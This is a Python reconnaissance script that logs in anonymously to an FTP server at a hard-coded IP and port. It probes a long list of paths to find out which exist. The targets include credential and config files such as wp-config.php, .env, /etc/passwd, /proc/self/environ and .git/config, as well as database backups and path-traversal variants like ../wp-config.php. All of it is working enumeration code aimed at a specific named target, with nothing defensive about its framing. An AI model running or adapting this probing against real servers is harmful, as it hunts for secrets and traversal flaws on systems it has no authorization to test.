#!/usr/bin/env python3
"""Check file existence via MDTM/SIZE on specific files - fresh per command."""
import ftplib
import socket

HOST = "103.160.107.175"
PORT = 6969
MAP = "/home/ubuntu/iptvgear.site/recon/active/ftp_filesystem.txt"

def log(msg=""):
    with open(MAP, "a") as f:
        f.write(msg + "\n")
    print(msg)

files_to_check = [
    "wp-config.php", "/wp-config.php",
    ".env", "/.env", ".htaccess", "/.htaccess",
    "index.php", "index.html", "index.htm",
    "config.php", "configuration.php",
    "db.php", "database.php",
    "composer.json", "package.json",
    "backup.zip", "backup.tar.gz", "backup.sql", "dump.sql",
    "admin.php", "login.php", "wp-login.php",
    "xmlrpc.php", "readme.html", "license.txt",
    "phpinfo.php", "info.php", "test.php",
    "passwd", "/passwd",
    "proftpd.conf", "/proftpd.conf",
    "../wp-config.php", "../.env",
    "../../wp-config.php",
    "FTP-shared/test.txt", "FTP-shared/readme",
    "FTP-shared/wp-config.php", "FTP-shared/config.php",
    "FTP-shared/.env", "FTP-shared/backup.sql",
    "FTP-shared/index.html", "FTP-shared/index.php",
    "root/test.txt", "root/readme",
    "root/wp-config.php", "root/config.php",
    "root/.env", "root/backup.sql",
    "root/index.html", "root/index.php",
    "backup", "www", "html",
    # More general web paths
    "/etc/passwd", "/etc/group", "/etc/hosts",
    "/proc/self/environ", "/proc/self/cmdline",
    "/.git/config", "git/config",
    "/server-status", "/server-info",
]

log(f"\n{'='*70}")
log("FILE EXISTENCE VIA MDTM + SIZE (fresh per file)")
log(f"{'='*70}")

found_files = []

for f in files_to_check:
    try:
        ftp2 = ftplib.FTP()
        ftp2.connect(HOST, PORT, timeout=10)
        ftp2.login("anonymous", "anonymous@test.com")
        
        for cmd_prefix in ["MDTM", "SIZE"]:
            try:
                resp = ftp2.sendcmd(f"{cmd_prefix} {f}")
                log(f"{cmd_prefix} {f}: {resp}")
                if cmd_prefix == "MDTM" and "550" not in resp and "501" not in resp and "500" not in resp:
                    found_files.append((f, resp))
                if cmd_prefix == "SIZE" and "550" not in resp and "501" not in resp and "500" not in resp:
                    found_files.append((f, resp))
            except Exception as e:
                err = str(e)
                if "550" not in err and "501" not in err and "500" not in err:
                    log(f"{cmd_prefix} {f}: ERROR {err}")
        
        ftp2.quit()
    except Exception as e:
        log(f"Connection error for {f}: {e}")

log(f"\n{'='*70}")
log("FILES FOUND:")
for f, resp in found_files:
    log(f"  {f} -> {resp}")
log(f"{'='*70}")

log("\n\nENUMERATION COMPLETE")